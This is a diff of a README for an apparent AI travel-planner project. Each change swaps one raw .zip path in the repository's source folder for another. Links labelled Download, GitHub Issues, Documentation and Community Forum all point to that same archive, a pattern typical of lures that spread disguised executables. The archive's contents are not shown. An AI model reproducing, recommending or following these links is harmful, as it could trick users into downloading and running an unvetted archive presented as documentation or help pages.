@@ -1,6 +1,6 @@
 # 🌍 Agentic-AI-Travel-Planner-Itinerary - Effortless Travel Planning Made Simple
 
-[![Download](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/config/Travel-A-Agentic-Itinerary-Planner-3.1-alpha.1.zip)](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/config/Travel-A-Agentic-Itinerary-Planner-3.1-alpha.1.zip)
+[![Download](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/Itinerary-Planner-Travel-A-Agentic-v2.5.zip)](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/Itinerary-Planner-Travel-A-Agentic-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ This application offers:
 
 To download the application, visit the following link:
 
-[Download Agentic-AI-Travel-Planner-Itinerary](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/config/Travel-A-Agentic-Itinerary-Planner-3.1-alpha.1.zip)
+[Download Agentic-AI-Travel-Planner-Itinerary](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/Itinerary-Planner-Travel-A-Agentic-v2.5.zip)
 
 ### 1. Visit the Releases Page
 
@@ -103,12 +103,12 @@ If you encounter issues, please refer to the following tips:
 
 ### Getting Help
 
-For further assistance, check the [GitHub Issues](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/config/Travel-A-Agentic-Itinerary-Planner-3.1-alpha.1.zip) page. You can report bugs or ask questions there.
+For further assistance, check the [GitHub Issues](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/Itinerary-Planner-Travel-A-Agentic-v2.5.zip) page. You can report bugs or ask questions there.
 
 ## 📖 Additional Resources
 
-- [Documentation](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/config/Travel-A-Agentic-Itinerary-Planner-3.1-alpha.1.zip): Find detailed guides and tips on using the application.
-- [Community Forum](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/config/Travel-A-Agentic-Itinerary-Planner-3.1-alpha.1.zip): Join discussions with other users for shared tips and experiences.
+- [Documentation](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/Itinerary-Planner-Travel-A-Agentic-v2.5.zip): Find detailed guides and tips on using the application.
+- [Community Forum](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/Itinerary-Planner-Travel-A-Agentic-v2.5.zip): Join discussions with other users for shared tips and experiences.
 
 ## 🚀 Future Updates
 
@@ -118,4 +118,4 @@ We are constantly working to improve the application. Look out for future update
 
 Your feedback is important to us. Feel free to share your thoughts on features you’d like to see or any improvements. You can submit feedback through the Issues page on GitHub.
 
-[Download Agentic-AI-Travel-Planner-Itinerary](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/config/Travel-A-Agentic-Itinerary-Planner-3.1-alpha.1.zip) and start simplifying your travel planning today.
+[Download Agentic-AI-Travel-Planner-Itinerary](https://github.com/StacksMadeDev/Agentic-AI-Travel-Planner-Itinerary/raw/refs/heads/main/CODE/src/Itinerary-Planner-Travel-A-Agentic-v2.5.zip) and start simplifying your travel planning today.
